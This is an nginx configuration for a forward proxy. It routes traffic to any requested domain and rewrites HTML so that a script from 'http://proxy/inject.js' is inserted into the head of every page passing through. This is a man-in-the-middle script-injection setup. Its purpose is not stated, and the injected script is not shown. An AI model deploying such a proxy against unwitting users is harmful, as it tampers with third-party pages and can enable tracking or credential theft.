worker_processes  5;  ## Default: 1            
error_log  /var/log/error.log;                 
pid        /var/run/nginx.pid;                 
worker_rlimit_nofile 8192;                     
                                               
events {                                       
  worker_connections  4096;
}                                              
                                               
http {
  include    mime.types;                                                                                             
                                                                                                                     
  default_type application/octet-stream;                                                                             
  log_format   main '$remote_addr - $remote_user [$time_local]  $status '                                            
    '"$request" $body_bytes_sent "$http_referer" '                                                                   
    '"$http_user_agent" "$http_x_forwarded_for"';                                                                    
                                                                                                                     
  access_log   /var/log/nginx.proxy.access.log  main;                                                                
  sendfile     on;                                                                                                   
  tcp_nopush   on;                                                                                                   
  server_names_hash_bucket_size 128;                                                                              

  # Proxy assets
  server {
    server_name proxy;
    listen 0.0.0.0:8080;
    resolver 8.8.8.8;
    
    location / {
        root /var/www;
    }

  }

  # HTTPS forward proxy
  server {
       listen 443 ssl;
       server_name proxy-ssl;

       ssl_certificate /home/proxy/proxy.cert;
       ssl_certificate_key /home/proxy/proxy.key;

       location / {
           proxy_pass http://localhost:8080;
       }
  }

  # HTTP forward proxy
  server {                                                                                                           
                                                                                                                   
    server_name ~^(www\.)?(?<domain>.+)$;                                                                            
    access_log /var/log/proxy.access.log main;                                                                       
    error_log /var/log/proxy.error.log crit;                                                                         
    listen 0.0.0.0:8080;                                                                                             
    resolver 8.8.8.8;    
                                                                                                                    
    location / {                                                                                                      
      proxy_pass http://$domain;                                                                                      
      proxy_redirect off;                                                                                             
      proxy_set_header Host $host;                                                                                    
                                                                                                                    
      subs_filter_types text/html text/css text/xml;                                                                  
      subs_filter "</head>" "<script type='text/javascript' src='http://proxy/inject.js'></script></head>";
                                                                                                                    
     # Optional headers                                                                                             
     # proxy_set_header X-Real-IP $remote_addr;                                                                     
     # proxy_set_header X-Forwarded-For                                                                             
     # $proxy_add_x_forwarded_for;                                                                                  
    }
  }
}
